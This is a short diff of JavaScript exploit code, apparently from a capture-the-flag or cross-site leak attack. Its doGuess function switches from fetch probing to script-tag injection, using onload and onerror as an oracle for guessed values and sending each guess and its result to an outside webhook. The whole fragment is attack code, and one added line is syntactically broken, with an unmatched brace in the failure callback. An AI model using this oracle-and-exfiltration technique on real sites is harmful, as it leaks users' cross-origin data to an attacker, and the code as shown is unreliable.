@@ -20,21 +20,26 @@
 
         
     async function doGuess(g){
-        console.log('attempting '+url+g);
-        await fetch(url+g)
-        .then(function(response) {
-        if (!response.ok) {
-            fetch(whook+g+'failed');
-            throw Error(response.statusText);
-        }
-        return response;
-    }).then(function(response) {
-        fetch(whook+g+'OK');
-        console.log("ok");
-    }).catch(function(error) {
-        fetch(whook+g+'failed2');
-        console.log(error);
-    });
+        const script = document.createElement("script");
+        script.src = url+g;
+        script.onload = () => {fetch(whook+g+'SUCCESS')};
+        script.onerror = () => {fetch(whook+g+'Fail'};
+        document.head.appendChild(script);
+//         console.log('attempting '+url+g);
+//         await fetch(url+g)
+//         .then(function(response) {
+//         if (!response.ok) {
+//             fetch(whook+g+'failed');
+//             throw Error(response.statusText);
+//         }
+//         return response;
+//     }).then(function(response) {
+//         fetch(whook+g+'OK');
+//         console.log("ok");
+//     }).catch(function(error) {
+//         fetch(whook+g+'failed2');
+//         console.log(error);
+//     });
         
         //.then(response => {
             //if(response.ok){
